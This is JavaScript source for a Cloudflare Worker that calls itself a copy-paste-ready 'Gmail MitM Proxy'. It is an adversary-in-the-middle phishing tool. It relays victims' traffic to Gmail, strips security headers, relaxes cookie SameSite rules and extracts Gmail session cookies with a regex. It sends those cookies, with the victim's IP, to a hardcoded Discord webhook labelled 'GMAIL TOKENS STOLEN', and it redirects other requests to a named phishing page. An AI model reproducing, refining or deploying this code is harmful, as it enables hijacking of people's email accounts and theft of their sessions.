// Gmail MitM Proxy v2.2 - OLDER STABLE VERSION (No syntax errors)
// Cloudflare Workers - Copy-paste ready

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1466098541880672500/C6sx-mBMSy3wW41IW0AnIGJoMfJNAa2905NeLyFCqHq6hArN4kGWC3k51S_HyNdplehC';

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
  
  // Rate limiting
  const rateKey = `rate_${clientIP}`;
  let hits = caches.default.get(rateKey) || [];
  if (hits.length > 100) {
    return new Response('Too many requests', {status: 429});
  }

  // Gmail paths
  if (url.pathname.startsWith('/mail') || 
      url.pathname.startsWith('/static') || 
      url.pathname === '/') {
    
    if (url.pathname === '/') {
      url.pathname = '/mail/u/0/#inbox';
    }
    
    return proxyGmail(url, request);
  }
  
  // Fallback to phishing page
  return Response.redirect('https://ia7353038-crypto.github.io/nINE-phish/', 302);
}

async function proxyGmail(url, request) {
  // Proxy headers
  let headers = new Headers(request.headers);
  headers.set('Host', 'mail.google.com');
  headers.set('Origin', 'https://mail.google.com');
  headers.set('Referer', 'https://mail.google.com/mail/u/0/#inbox');
  
  // Make request to real Gmail
  let gmailReq = new Request('https://mail.google.com' + url.pathname + url.search, {
    method: request.method,
    headers: headers,
    body: request.body
  });
  
  let response = await fetch(gmailReq);
  
  // Steal cookies/tokens
  const cookies = response.headers.get('Set-Cookie');
  if (cookies) {
    await stealCookies(cookies, clientIP);
  }
  
  // Return modified response
  return modifyResponse(response);
}

async function stealCookies(cookies, ip) {
  // Extract Gmail tokens
  const tokenRegex = /(SID|SSID|HSID|APISID|SAPISID|GAPS)=([^;,\s]+)/gi;
  let tokens = [];
  let match;
  
  while (match = tokenRegex.exec(cookies)) {
    tokens.push(`${match[1]}: ${match[2]}`);
  }
  
  if (tokens.length > 0) {
    const payload = {
      content: `**GMAIL TOKENS STOLEN** (${tokens.length})\n**IP:** \`${ip}\`\n**Tokens:**\n${tokens.slice(0,5).join('\n')}`,
      username: 'Gmail Proxy v2.2'
    };
    
    fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    });
  }
}

function modifyResponse(response) {
  const headers = new Headers(response.headers);
  
  // Remove security headers
  headers.delete('Content-Security-Policy');
  headers.delete('X-Frame-Options');
  
  // Fix cookies for proxy
  let cookies = headers.getSetCookie() || [];
  headers.delete('Set-Cookie');
  
  cookies.forEach(cookie => {
    // Relax SameSite
    cookie = cookie.replace(/SameSite=(Strict|Lax)/gi, 'SameSite=None');
    headers.append('Set-Cookie', cookie);
  });
  
  return new Response(response.body, {
    status: response.status,
    headers: headers
  });
}
